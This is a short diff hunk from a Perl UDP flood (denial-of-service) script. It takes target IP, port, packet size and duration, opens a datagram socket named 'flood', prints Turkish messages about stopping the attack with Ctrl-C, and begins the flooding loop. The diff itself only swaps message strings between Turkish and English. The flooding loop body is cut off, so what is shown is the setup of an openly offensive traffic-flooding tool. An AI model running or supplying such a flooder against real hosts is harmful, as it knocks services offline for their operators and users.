@@ -18,11 +18,11 @@ if ($#ARGV != 3) {
  
 my ($ip,$port,$size,$time) = @ARGV;
 my ($iaddr,$endtime,$psize,$pport);
-$iaddr = inet_aton("$ip") or die "Cannot connect to $ip\n";
+$iaddr = inet_aton("$ip") or die "$ip adresine baglanılamadı\n";
 $endtime = time() + ($time ? $time : 1000000);
 socket(flood, PF_INET, SOCK_DGRAM, 17);
 print "~Saldırıyı durdurmak için\'Ctrl-C\'\n\n";
-print "|IP|\t\t |Port|\t\t |paket|\t\t |zaman|\n";
+print "|IP|\t\t |Port|\t\t |size|\t\t |time|\n";
 print "|$ip|\t |$port|\t\t |$size|\t\t |$time|\n";
 print "saldırıyı durdurmak için\'Ctrl-C'\n" unless $time;
 for (;time() <= $endtime;) {
